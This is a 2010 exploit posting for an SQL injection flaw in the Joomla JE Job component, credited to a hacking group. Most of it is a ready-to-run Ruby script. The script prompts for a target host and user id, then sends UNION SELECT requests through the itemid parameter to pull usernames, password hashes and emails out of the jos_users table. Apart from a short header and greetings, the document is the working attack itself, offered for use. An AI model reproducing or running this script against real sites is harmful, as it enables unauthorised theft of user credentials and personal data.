----------------------------Information------------------------------------------------
+Name : joomla JE Job Component <=  SQL injection Vulnerability Exploit
+Autor : Easy Laster
+Date   : 30.09.2010
+Script  : joomla JE Job Component
+Demo : http://joomlaextensions.co.in/jobcomponent/
+Download : http://joomlaextensions.co.in/extensions/modules/je-content-menu.html
?page=shop.product_details&category_id=4&flypage=flypage.tpl&product_id=59&vmcchk=1
+Price : free
+Language : PHP
+Discovered by Easy Laster
+Security Group 4004-Security-Project
+Greetz to Team-Internet ,Underground Agents and free-hack.com
+And all Friends of Cyberlive : R!p,Eddy14,Silent Vapor,Nolok,
Kiba,-tmh-,Dr.ChAoS,HANN!BAL,Kabel,-=Player=-,Lidloses_Auge,
N00bor,Ic3Drag0n,novaca!ne,n3w7u,Maverick010101,s0red,c1ox,enco,
  
---------------------------------------------------------------------------------------
                                                                                       
 ___ ___ ___ ___                         _ _           _____           _         _ 
| | |   |   | | |___ ___ ___ ___ _ _ ___|_| |_ _ _ ___|  _  |___ ___  |_|___ ___| |_
|_  | | | | |_  |___|_ -| -_|  _| | |  _| |  _| | |___|   __|  _| . | | | -_|  _|  _|
  |_|___|___| |_|   |___|___|___|___|_| |_|_| |_  |   |__|  |_| |___|_| |___|___|_|
                                              |___|                 |___|          
  
  
----------------------------------------------------------------------------------------
#!/usr/bin/ruby
#4004-security-project.com
#Discovered and vulnerability by Easy Laster
print "
#########################################################
#                  4004-Security-Project                #
#########################################################
#                    joomla JE Job Component            #
#                          Exploit                      #
#                     Using Host+Path+id                #
#                   www.demo.de /forum/ 1               #
#                         Easy Laster                   #
#########################################################
"
require 'net/http'
print "#########################################################"
print "\nEnter host name (site.com)->"
host=gets.chomp
print "#########################################################"
print "\nEnter script path (/forum/)->"
path=gets.chomp
print "\n#########################################################"
print "\nEnter the id (id)->"
userid=gets.chomp
print "#########################################################"
begin
dir = "index.php?option=com_jejob&view=item_detail"+
"&itemid=1+and+1=0+uNiOn+sElEcT+1,concat(0x23,0x23,"+
"0x23,0x23,0x23,id,0x23,0x23,0x23,0x23,0x23),3,4,5,"+
"6,7,8,9,10,11,12,13+from+jos_users+where+id="+ userid +"--+"
   http = Net::HTTP.new(host, 80)
   resp= http.get(path+dir)
   print "\nid -> "+(/#####(.+)#####/).match(resp.body)[1]
       dir = "index.php?option=com_jejob&view=item_detail&"+
       "itemid=1+and+1=0+uNiOn+sElEcT+1,concat(0x23,0x23,0x23"+
       ",0x23,0x23,username,0x23,0x23,0x23,0x23,0x23),3,4,5,"+
       "6,7,8,9,10,11,12,13+from+jos_users+where+id="+ userid +"--+"
           http = Net::HTTP.new(host, 80)
           resp= http.get(path+dir)
           print "\nUsername -> "+(/#####(.+)#####/).match(resp.body)[1]
               dir = "index.php?option=com_jejob&view=item_detail&itemid"+
               "=1+and+1=0+uNiOn+sElEcT+1,concat(0x23,0x23,0x23,0x23,0x23"+
               ",password,0x23,0x23,0x23,0x23,0x23),3,4,5,6,7,8,9,10,11,12"+
               ",13+from+jos_users+where+id="+ userid +"--+"
            http = Net::HTTP.new(host, 80)
            resp= http.get(path+dir)
            print "\nEPassword -> "+(/#####(.+)#####/).match(resp.body)[1]
      dir = "index.php?option=com_jejob&view=item_detail&itemid=1+and+1=0"+
      "+uNiOn+sElEcT+1,concat(0x23,0x23,0x23,0x23,0x23,email,0x23,0x23,0x23"+
      ",0x23,0x23),3,4,5,6,7,8,9,10,11,12,13+from+jos_users+where+id="+ userid +"--+"
   http = Net::HTTP.new(host, 80)
   resp= http.get(path+dir)
  print "\nEmail -> "+(/#####(.+)#####/).match(resp.body)[1]
  print "\n#########################################################"
rescue
print "\nExploit failed"
end